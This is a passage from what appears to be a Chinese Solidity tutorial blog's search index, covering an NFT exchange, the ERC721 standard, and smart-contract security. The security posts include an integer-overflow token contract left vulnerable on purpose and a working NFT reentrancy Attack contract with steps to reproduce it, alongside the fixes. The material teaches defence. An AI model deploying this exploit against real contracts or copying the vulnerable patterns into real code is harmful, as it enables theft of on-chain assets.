声明IERC721接口合约变量 IERC721 _nft = IERC721(_nftAddr); require(_nft.ownerOf(_tokenId) == address(this), \"Invalid Order\"); // NFT在合约中 // 将NFT转给买家 _nft.safeTransferFrom(address(this), msg.sender, _tokenId); // 将ETH转给卖家，多余ETH给买家退款 payable(_order.owner).transfer(_order.price); payable(msg.sender).transfer(msg.value-_order.price); delete nftList[_nftAddr][_tokenId]; // 删除order // 释放Purchase事件 emit Purchase(msg.sender, _nftAddr, _tokenId, msg.value); } ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:2:5","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"Remix实现 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:0","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"1. 部署NFT合约 部署Ape NFT合约。 将首个NFT mint给自己，这里mint给自己是为了之后能够上架NFT、修改价格等一系类操作。 mint(address to, uint tokenId)方法有2个参数: to:将 NFT mint给指定的地址，这里通常是自己的钱包地址。 tokenId: Ape合约定义了总量为10000个NFT，图中mint它的的第一个和第二个NFT，tokenId分别为0和1。 在Ape合约中，利用ownerOf确认自己已经获得tokenId为0的NFT。 ownerOf(uint tokenId)方法有1个参数: tokenId: tokenId为NFT的id，本案例中为上述mint的0Id。 按照上述方法，将TokenId为 0 和 1 的NFT都mint给自己，其中tokenId为0的，我们执行更新购买操作，tokenId为1的，我们执行下架操作。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:1","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"2. 部署NFTSwap合约 部署NFTSwap合约。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:2","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"3. 将要上架的NFT授权给NFTSwap合约 在Ape合约中调用 approve()授权函数，将自己持有的tokenId为0的NFT授权给NFTSwap合约地址。 approve(address to, uint tokenId)方法有2个参数: to: 将tokenId授权给 to 地址，本案例中将授权给NFTSwap合约地址。 tokenId: tokenId为NFT的id，本案例中为上述mint的0Id。 按照上述方法，同理将tokenId为1的NFT也授权给NFTSwap合约地址。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:3","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"4. 上架NFT 调用NFTSwap合约的list()函数，将自己持有的tokenId为0的NFT上架到NFTSwap，价格设为1 wei。 list(address _nftAddr, uint256 _tokenId, uint256 _price)方法有3个参数: _nftAddr: _nftAddr为NFT合约地址，本案例中为Ape合约地址。 _tokenId: _tokenId为NFT的id，本案例中为上述mint的0Id。 _price: _price为NFT的价格，本案例中为1 wei。 按照上述方法，同理将自己持有的tokenId为1的NFT上架到NFTSwap，价格设为1 wei。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:4","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"5. 查看上架NFT 调用NFTSwap合约的nftList()函数查看上架的NFT。 nftList:是一个NFT Order的映射，结构如下： nftList[_nftAddr][_tokenId]: 输入_nftAddr和_tokenId，返回一个NFT订单。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:5","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"6. 更新NFT价格 调用NFTSwap合约的update()函数，将tokenId为0的NFT价格更新为77 wei update(address _nftAddr, uint256 _tokenId, uint256 _newPrice)方法有3个参数: _nftAddr: _nftAddr为NFT合约地址，本案例中为Ape合约地址。 _tokenId: _tokenId为NFT的id，本案例中为上述mint的0Id。 _newPrice: _newPrice为NFT的新价格，本案例中为77 wei。 执行update之后，调用nftList 查看更新后的价格 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:6","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"7. 下架NFT 调用NFTSwap合约的revoke()函数下架NFT。 上述文章中，我们上架了2个NFT，tokenId分别为 0 和 1。本次方法中，我们下架tokenId为1的NFT。 revoke(address _nftAddr, uint256 _tokenId)方法有2个参数: _nftAddr: _nftAddr为NFT合约地址，本案例中为Ape合约地址。 _tokenId: _tokenId为NFT的id，本案例中为上述mint的1Id。 调用NFTSwap合约的nftList()函数，可以看到NFT已经下架。再次上架需要重新授权。 注意下架NFT之后，需要重新从步骤3开始，重新授权和上架NFT之后，才能进行购买 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:7","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"8. 购买NFT 切换账号，调用NFTSwap合约的purchase()函数购买NFT，购买时需要输入NFT合约地址，tokenId，并输入支付的ETH。 我们下架了tokenId为1的NFT，现在还存在tokenId为0的NFT，所以我们可以购买tokenId为0的NFT。 purchase(address _nftAddr, uint256 _tokenId, uint256 _wei)方法有3个参数: _nftAddr: _nftAddr为NFT合约地址，本案例中为Ape合约地址。 _tokenId: _tokenId为NFT的id，本案例中为上述mint的0Id。 _wei: _wei为支付的ETH数量，本案例中为77 wei。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:8","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"7. 验证NFT持有人改变 购买成功之后，调用Ape合约的ownerOf()函数，可以看到NFT持有者发生变化，购买成功！ ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:3:9","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["基础知识","Solidity 应用"],"content":"总结 我们建立了一个零手续费的去中心化NFT交易所。OpenSea虽然对NFT的发展做了很大贡献，但它的缺点也非常明显：高手续费、不发币回馈用户、交易机制容易被钓鱼导致用户资产丢失。目前Looksrare和dydx等新的NFT交易平台正在挑战OpenSea的位置，Uniswap也在研究新的NFT交易所。相信不久的将来，我们会用到更好的NFT交易所。 ","date":"2022-08-27","objectID":"/posts/solidity-erc721-nft-swap.html:4:0","tags":["solidity","basic"],"title":"如何创建一个NFT交易所","uri":"/posts/solidity-erc721-nft-swap.html"},{"categories":["合约安全"],"content":" 引言 整型溢出漏洞（Arithmetic Over/Under Flows）是一个比较经典的漏洞，Solidity 0.8 版本后内置了Safemath库，因此很少发生。 ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:0:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"1 整型溢出 以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 uint8，只能表示 [0,255] 范围内的数字。如果给 uint8 类型变量的赋值 257，则会上溢（overflow）变为 1；如果给它赋值-1，则会下溢（underflow）变为255。 攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为0，他凭空花 $1 之后，余额突然变成了 $2^256-1。2018年的土狗项目 PoWHC 因为这个漏洞被盗了 866 ETH。 ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:1:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"2 漏洞合约复现 下面这个例子是一个简单的代币合约，参考了 Ethernaut 中的合约。它有 2 个状态变量：balances 记录了每个地址的余额，totalSupply 记录了代币总供给。 它有 3 个函数： 构造函数：初始化代币总供给。 transfer()：转账函数。 balanceOf()：查询余额函数。 由于solidity 0.8.0 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 unchecked 关键字，在代码块中临时关掉溢出检查，就像我们在 transfer() 函数中做的那样。 这个例子中的漏洞就出现在transfer() 函数中，require(balances[msg.sender] - _value \u003e= 0); 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; contract Token { mapping(address =\u003e uint) balances; uint public totalSupply; constructor(uint _initialSupply) { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { unchecked{ require(balances[msg.sender] - _value \u003e= 0); balances[msg.sender] -= _value; balances[_to] += _value; } return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } } ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:2:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"3 Remix复现步骤 部署 Token 合约，将总供给设为 100。 向另一个账户转账 1000 个代币，可以转账成功。 查询自己账户的余额，发现是一个非常大的数字，约为2^256。 ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:3:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"4 预防办法 Solidity 0.8.0 之前的版本，在合约中引用 Safemath 库，在整型溢出时报错。 Solidity 0.8.0 之后的版本内置了 Safemath，因此几乎不存在这类问题。开发者有时会为了节省gas使用 unchecked 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。 ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:4:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"5 总结 介绍了经典的整型溢出漏洞，由于solidity 0.8.0 版本后内置 Safemath 的整型溢出检查，这类漏洞已经很少见了。 ","date":"2022-08-25","objectID":"/posts/solidity-smart-contract-security-overflow.html:5:0","tags":["solidity","security","Safemath"],"title":"合约安全：整型溢出","uri":"/posts/solidity-smart-contract-security-overflow.html"},{"categories":["合约安全"],"content":"1 NFT重入风险 重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币。转账NFT时并不会触发合约的fallback或receive函数，为什么会有重入风险呢？ 这是因为NFT标准（ERC721/ERC1155）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。 ERC721 和 ERC1155 有潜在重入风险的函数 ERC721： safeTransferFrom _safeTransfer _safeMint checkOnERC721Received ERC1155： safeTransferFrom _safeTransferFrom safeBatchTransferFrom _safeBatchTransferFrom _mint _mintBatch _doSafeTransferAcceptanceCheck _doSafeBatchTransferAcceptanceCheck ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:1:0","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"2 漏洞复现 这是一个ERC721合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。 ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:2:0","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"2.1 漏洞合约 NFTReentrancy合约继承了ERC721合约，它主要有 2 个状态变量，totalSupply记录NFT的总供给，mintedAddress记录已铸造过的地址，防止一个用户多次铸造。它主要有 2 个函数： 构造函数: 初始化 ERC721 NFT的名称和代号。 mint(): 铸造函数，每个用户可以免费铸造1个NFT。注意：这个函数有重入漏洞！ contract NFTReentrancy is ERC721 { uint256 public totalSupply; mapping(address =\u003e bool) public mintedAddress; // 构造函数，初始化NFT合集的名称、代号 constructor() ERC721(\"Reentry NFT\", \"ReNFT\"){} // 铸造函数，每个用户只能铸造1个NFT // 有重入漏洞 function mint() payable external { // 检查是否mint过 require(mintedAddress[msg.sender] == false); // 增加total supply totalSupply++; // mint _safeMint(msg.sender, totalSupply); // 记录mint过的地址 mintedAddress[msg.sender] = true; } } ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:2:1","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"2.2 攻击合约 NFTReentrancy合约的重入攻击点在mint()函数会调用ERC721合约中的_safeMint()，从而调用转入地址的_checkOnERC721Received()函数。如果转入地址的_checkOnERC721Received()包含恶意代码，就能进行攻击。 Attack合约继承了IERC721Receiver合约，它有 1 个状态变量nft记录了有漏洞的NFT合约地址。它有 3 个函数: 构造函数: 初始化有漏洞的NFT合约地址。 attack(): 攻击函数，调用NFT合约的mint()函数并发起攻击。 onERC721Received(): 嵌入了恶意代码的ERC721回调函数，会重复调用mint()函数，并铸造100个NFT。 contract Attack is IERC721Receiver{ NFTReentrancy public nft; // 有漏洞的nft合约地址 // 初始化NFT合约地址 constructor(NFTReentrancy _nftAddr) { nft = _nftAddr; } // 攻击函数，发起攻击 function attack() external { nft.mint(); } // ERC721的回调函数，会重复调用mint函数，铸造100个 function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) { if(nft.balanceOf(address(this)) \u003c 100){ nft.mint(); } return this.onERC721Received.selector; } } ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:2:2","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"2.3 Remix复现 部署NFTReentrancy合约。 部署Attack合约，参数填NFTReentrancy合约地址。 调用Attack合约的attack()函数发起攻击。 调用NFTReentrancy合约的balanceOf()函数查询Attack合约的持仓，可以看到持有100个NFT，攻击成功。 ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:2:3","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"3 预防方法 主要有两种办法来预防重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。 检查-影响-交互模式：它强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。我们可以用这个模式修复有漏洞的mint()函数: function mint() payable external { // 检查是否mint过 require(mintedAddress[msg.sender] == false); // 增加total supply totalSupply++; // 记录mint过的地址 mintedAddress[msg.sender] = true; // mint _safeMint(msg.sender, totalSupply); } 重入锁：它是一种防止重入函数的修饰器（modifier）。建议直接使用OpenZeppelin提供的ReentrancyGuard ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:3:0","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["合约安全"],"content":"4 总结 介绍了NFT的重入攻击漏洞，并攻击了一个有漏洞的NFT合约，铸造了100个NFT。目前主要有两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。 ","date":"2022-08-22","objectID":"/posts/solidity-smart-contract-security-nft-re-entrancy.html:4:0","tags":["solidity","security","fallback","nft","erc721","erc1155"],"title":"合约安全：NFT重入攻击","uri":"/posts/solidity-smart-contract-security-nft-re-entrancy.html"},{"categories":["基础知识","Solidity 应用"],"content":" 引言 BTC和ETH这类代币都属于同质化代币，矿工挖出的第1枚BTC与第10000枚BTC并没有不同，是等价的。但世界中很多物品是不同质的，其中包括房产、古董、虚拟艺术品等等，这类物品无法用同质化代币抽象。因此，以太坊EIP721提出了ERC721标准，来抽象非同质化的物品。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:0:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"EIP与ERC 这里有一个点需要理解，本节标题是ERC721，这里又提到了EIP721,这两个是什么关系呢？ EIP全称 Ethereum Imporvement Proposals(以太坊改进建议), 是以太坊开发者社区提出的改进建议, 是一系列以编号排定的文件, 类似互联网上IETF的RFC。 EIP可以是 Ethereum 生态中任意领域的改进, 比如新特性、ERC、协议改进、编程工具等等。 ERC全称 Ethereum Request For Comment (以太坊意见征求稿), 用以记录以太坊上应用级的各种开发标准和协议。如典型的Token标准(ERC20, ERC721)、名字注册(ERC26, ERC13), URI范式(ERC67), Library/Package格式(EIP82), 钱包格式(EIP75,EIP85)。 ERC协议标准是影响以太坊发展的重要因素, 像ERC20, ERC223, ERC721, ERC777等, 都是对以太坊生态产生了很大影响。 所以最终结论：EIP包含ERC。 在这一节学习完成后，才能明白为什么上来讲ERC165而不是ERC721，想要看结论可直接移动到最下面 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:1:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC165 通过ERC165标准，智能合约可以声明它支持的接口，供其他合约检查。简单的说，ERC165就是检查一个智能合约是不是支持了ERC721，ERC1155的接口。 IERC165接口合约只声明了一个supportsInterface函数，输入要查询的interfaceId接口id，若合约实现了该接口id，则返回true： interface IERC165 { /** * @dev 如果合约实现了查询的`interfaceId`，则返回true * 规则详见：https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] * */ function supportsInterface(bytes4 interfaceId) external view returns (bool); } 我们可以看下ERC721是如何实现supportsInterface()函数的： function supportsInterface(bytes4 interfaceId) external pure override returns (bool) { return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC165).interfaceId; } 当查询的是IERC721或IERC165的接口id时，返回true；反之返回false。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:2:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC721 IERC721是ERC721标准的接口合约，规定了ERC721要实现的基本函数。它利用tokenId来表示特定的非同质化代币，授权或转账都要明确tokenId；而ERC20只需要明确转账的数额即可。 /** * @dev ERC721标准接口. */ interface IERC721 is IERC165 { event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data ) external; function safeTransferFrom( address from, address to, uint256 tokenId ) external; function transferFrom( address from, address to, uint256 tokenId ) external; function approve(address to, uint256 tokenId) external; function setApprovalForAll(address operator, bool _approved) external; function getApproved(uint256 tokenId) external view returns (address operator); function isApprovedForAll(address owner, address operator) external view returns (bool); } ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:3:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC721事件 IERC721包含3个事件，其中Transfer和Approval事件在ERC20中也有。 Transfer事件：在转账时被释放，记录代币的发出地址from，接收地址to和tokenid。 Approval事件：在授权时释放，记录授权地址owner，被授权地址approved和tokenid。 ApprovalForAll事件：在批量授权时释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:3:1","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC721函数 balanceOf：返回某地址的NFT持有量balance。 ownerOf：返回某tokenId的主人owner。 transferFrom：普通转账，参数为转出地址from，接收地址to和tokenId。 safeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。 approve：授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。 getApproved：查询tokenId被批准给了哪个地址。 setApprovalForAll：将自己持有的该系列NFT批量授权给某个地址operator。 isApprovedForAll：查询某地址的NFT是否批量授权给了另一个operator地址。 safeTransferFrom：安全转账的重载函数，参数里面包含了data。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:3:2","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC721Receiver 如果一个合约没有实现ERC721的相关函数，转入的NFT就进了黑洞，永远转不出来了。为了防止误转账，ERC721实现了safeTransferFrom()安全转账函数，目标合约必须实现了IERC721Receiver接口才能接收ERC721代币，不然会revert。IERC721Receiver接口只包含一个onERC721Received()函数。 // ERC721接收者接口：合约必须实现这个接口来通过安全转账接收ERC721 interface IERC721Receiver { function onERC721Received( address operator, address from, uint tokenId, bytes calldata data ) external returns (bytes4); } 我们看下ERC721利用_checkOnERC721Received来确保目标合约实现了onERC721Received()函数（返回onERC721Received的selector）： function _checkOnERC721Received( address from, address to, uint tokenId, bytes memory _data ) private returns (bool) { if (to.isContract()) { return IERC721Receiver(to).onERC721Received( msg.sender, from, tokenId, _data ) == IERC721Receiver.onERC721Received.selector; } else { return true; } } ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:4:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC721Metadata IERC721Metadata是ERC721的拓展接口，实现了3个查询metadata元数据的常用函数： name()：返回代币名称。 symbol()：返回代币代号。 tokenURI()：通过tokenId查询metadata的链接url，ERC721特有的函数。 interface IERC721Metadata is IERC721 { function name() external view returns (string memory); function symbol() external view returns (string memory); function tokenURI(uint256 tokenId) external view returns (string memory); } ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:5:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC721主合约 ERC721主合约实现了IERC721，IERC165和IERC721Metadata定义的所有功能，包含4个状态变量和17个函数。实现都比较简单，每个函数的功能见代码注释： // SPDX-License-Identifier: MIT // by 0xAA pragma solidity ^0.8.4; import \"./IERC165.sol\"; import \"./IERC721.sol\"; import \"./IERC721Receiver.sol\"; import \"./IERC721Metadata.sol\"; import \"./Address.sol\"; import \"./String.sol\"; contract ERC721 is IERC721, IERC721Metadata{ using Address for address; // 使用Address库，用isContract来判断地址是否为合约 using Strings for uint256; // 使用String库， // Token名称 string public override name; // Token代号 string public override symbol; // tokenId 到 owner address 的持有人映射 mapping(uint =\u003e address) private _owners; // address 到 持仓数量 的持仓量映射 mapping(address =\u003e uint) private _balances; // tokenID 到 授权地址 的授权映射 mapping(uint =\u003e address) private _tokenApprovals; // owner地址。到operator地址 的批量授权映射 mapping(address =\u003e mapping(address =\u003e bool)) private _operatorApprovals; /** * 构造函数，初始化`name` 和`symbol` . */ constructor(string memory name_, string memory symbol_) { name = name_; symbol = symbol_; } // 实现IERC165接口supportsInterface function supportsInterface(bytes4 interfaceId) external pure override returns (bool) { return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC165).interfaceId || interfaceId == type(IERC721Metadata).interfaceId; } // 实现IERC721的balanceOf，利用_balances变量查询owner地址的balance。 function balanceOf(address owner) external view override returns (uint) { require(owner != address(0), \"owner = zero address\"); return _balances[owner]; } // 实现IERC721的ownerOf，利用_owners变量查询tokenId的owner。 function ownerOf(uint tokenId) public view override returns (address owner) { owner = _owners[tokenId]; require(owner != address(0), \"token doesn't exist\"); } // 实现IERC721的isApprovedForAll，利用_operatorApprovals变量查询owner地址是否将所持NFT批量授权给了operator地址。 function isApprovedForAll(address owner, address operator) external view override returns (bool) { return _operatorApprovals[owner][operator]; } // 实现IERC721的setApprovalForAll，将持有代币全部授权给operator地址。调用_setApprovalForAll函数。 function setApprovalForAll(address operator, bool approved) external override { _operatorApprovals[msg.sender][operator] = approved; emit ApprovalForAll(msg.sender, operator, approved); } // 实现IERC721的getApproved，利用_tokenApprovals变量查询tokenId的授权地址。 function getApproved(uint tokenId) external view override returns (address) { require(_owners[tokenId] != address(0), \"token doesn't exist\"); return _tokenApprovals[tokenId]; } // 授权函数。通过调整_tokenApprovals来，授权 to 地址操作 tokenId，同时释放Approval事件。 function _approve( address owner, address to, uint tokenId ) private { _tokenApprovals[tokenId] = to; emit Approval(owner, to, tokenId); } // 实现IERC721的approve，将tokenId授权给 to 地址。条件：to不是owner，且msg.sender是owner或授权地址。调用_approve函数。 function approve(address to, uint tokenId) external override { address owner = _owners[tokenId]; require( msg.sender == owner || _operatorApprovals[owner][msg.sender], \"not owner nor approved for all\" ); _approve(owner, to, tokenId); } // 查询 spender地址是否可以使用tokenId（他是owner或被授权地址）。 function _isApprovedOrOwner( address owner, address spender, uint tokenId ) private view returns (bool) { return (spender == owner || _tokenApprovals[tokenId] == spender || _operatorApprovals[owner][spender]); } /* * 转账函数。通过调整_balances和_owner变量将 tokenId 从 from 转账给 to，同时释放Transfer事件。 * 条件: * 1. tokenId 被 from 拥有 * 2. to 不是0地址 */ function _transfer( address owner, address from, address to, uint tokenId ) private { require(from == owner, \"not owner\"); require(to != address(0), \"transfer to the zero address\"); _approve(owner, address(0), tokenId); _balances[from] -= 1; _balances[to] += 1; _owners[tokenId] = to; emit Transfer(from, to, tokenId); } // 实现IERC721的transferFrom，非安全转账，不建议使用。调用_transfer函数 function transferFrom( address from, address to, uint tokenId ) external override { address owner = ownerOf(tokenId); require( _isApprovedOrOwner(owner, msg.sender, tokenId), \"not owner nor approved\" ); _transfer(owner, from, to, tokenId); } /** * 安全转账，安全地将 tokenId 代币从 from 转移到 to，会检查合约接收者是否了解 ERC721","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:6:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"写一个免费铸造的APE 我们来利用ERC721来写一个免费铸造的APE，总量设置为10000，只需要重写一下mint()和baseURI()函数即可。由于baseURI()设置的和BAYC一样，元数据会直接获取无聊猿的，类似RRBAYC： // SPDX-License-Identifier: MIT // by 0xAA pragma solidity ^0.8.4; import \"./ERC721.sol\"; contract Ape is ERC721{ uint public MAX_APES = 10000; // 总量 // 构造函数 constructor(string memory name_, string memory symbol_) ERC721(name_, symbol_){ } //BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ function _baseURI() internal pure override returns (string memory) { return \"ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/\"; } // 铸造函数 function mint(address to, uint tokenId) external { require(tokenId \u003e= 0 \u0026\u0026 tokenId \u003c MAX_APES, \"tokenId out of range\"); _mint(to, tokenId); } } ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:7:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"发行ERC721NFT 有了ERC721标准后，在ETH链上发行NFT变得非常简单。现在，我们发行属于我们的NFT。 在Remix上编译好ERC721合约和Ape合约（按照顺序），在部署栏点击下按钮，输入构造函数的参数，name_和symbol_都设为APE，然后点击transact键进行部署。 这样，我们就创建好了APENFT。我们需要运行mint()函数来给自己铸造一些代币。在mint函数那一栏点开右侧的下按钮输入账户地址，和tokenid，并点击mint按钮，为自己铸造0号APENFT。 可以点开右侧的Debug按钮，具体查看下面的logs。 里面包含四个关键信息： 事件Transfer 铸造地址0x0000000000000000000000000000000000000000 接收地址0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 tokenid0 我们利用balanceOf()函数来查询账户余额。输入我们当前的账户，可以看到有一个NFT，铸造成功。 账户信息如图左侧，右侧标注为函数执行的具体信息。 我们也可以利用ownerOf()函数来查询NFT属于哪个账户。输入tokenid，可以我们的地址，查询无误。 ","date":"2022-08-21","objectID":"/posts/solidity-erc721.html:8:0","tags":["solidity","basic"],"title":"非同质化代币标准ERC721","uri":"/posts/solidity-erc721.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC165与ERC721详解 上面说到,为了防止NFT被转到一个没有能力操作NFT的合约中去,目标必须正确实现ERC721TokenReceiver接口： interface ERC721TokenReceiver { function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4); } 